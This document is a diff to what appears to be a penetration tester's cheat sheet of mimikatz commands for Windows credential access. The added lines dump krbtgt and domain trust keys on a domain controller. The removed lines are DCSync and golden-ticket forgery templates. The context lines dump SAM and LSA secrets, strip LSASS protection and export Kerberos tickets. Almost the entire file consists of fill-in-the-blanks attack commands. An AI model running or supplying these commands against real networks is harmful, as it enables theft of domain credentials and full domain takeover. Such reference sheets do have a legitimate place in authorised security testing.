@@ -3,6 +3,12 @@
 % mimikatz, passwords
 #plateform/windows  #target/local  #cat/CREDENTIAL-ACCESS/CREDS_RECOVER 
 
+## _doc
+```
+https://tools.thehacker.recipes/mimikatz/modules/lsadump/lsa
+```
+
+
 ## ps1 - load Invoke-Mimikatz
 https://github.com/clymb3r/PowerShell/blob/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1
 ```powershell
@@ -24,15 +30,6 @@ mimikatz.exe "privilege::debug" "!+" "!processprotect /process:lsass.exe /remove
 mimikatz.exe "privilege::debug" "token::elevate" "vault::cred /patch" "exit"
 ```
 
-## dcsync - user (krbtgt/Administrator)
-```
-mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:<domain_fqdn> /user:<user>" "exit"
-```
-
-## dcsync - all (krbtgt/Administrator)
-```
-mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:<domain_fqdn> /all /csv" "exit"
-```
 
 ## dump SAM - online
 ```
@@ -52,6 +49,16 @@ mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords /all"
 ## dump LSA - secret keys
 ```
 mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::lsa /inject /name:<username>"
+```
+
+## dump LSA - krbtgt keys (on a DC)
+```
+mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::krbtgt"
+```
+
+## dump LSA - trust keys (on a DC)
+```
+mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::trust /patch"
 ```
 
 ## dump LSA - extract credentials from dump
@@ -81,26 +88,6 @@ sekurksa::tickets
 ## tickets - extract 
 ```
 sekurlsa::tickets /export
-```
-
-## tickets - golden   
-```
-kerberos::golden /user:<user|administrator> /id:<user_rid|500> /group:500,501,513,512,520,518 /krbtgt:<krbtgt_nthash>  /sid:<domain_sid> /domain:<domain_fqdn> /ptt [/ticket:c:\temp\trust.kirbi]
-```
-
-## tickets - golden + ExtraSID (parent-child)  
-```
-kerberos::golden /export /user:<user|jubeaz> /id:<user_rid> /group:500,501,513,512,520,518 /krbtgt:<krbtgt_nthash>  /sid:<src_domain_sid> /domain:<src_domain_fqdn> /sids:<dst_domain_sid>-<rid|519> /ptt [/ticket:c:\temp\trust.kirbi]
-```
-
-## tickets - golden + ExtraSID (parent-child) (dc account)
-```
-kerberos::golden /export /user:<dc_name>$ /id:<dc_rid> /krbtgt:<krbtgt_nthash>  /groups:516 /sid:<src_domain_sid> /domain:<src_domain_fqdn> /sids:<dst_domain_sid>-<rid|516> [/startoffset:-10 /endin:60 /renewmax:10080] /ptt [/ticket:c:\temp\trust.kirbi]
-```
-
-## tickets - (golden) Inter-Realm TGT  
-```
-kerberos::golden /export /user:<user> /id:<user_rid> /group:500,501,513,512,520,518 /rc4:<trust_nthash>  /sid:<src_domain_sid> /domain:<src_domain_FQDN> /sids:<dst_domain_sid>-<rid|519> /service:krbtgt /target:<dst_domain_fqdn> /ptt [/ticket:c:\temp\trust.kirbi]
 ```
 
 % mimikatz, dpapi, credman
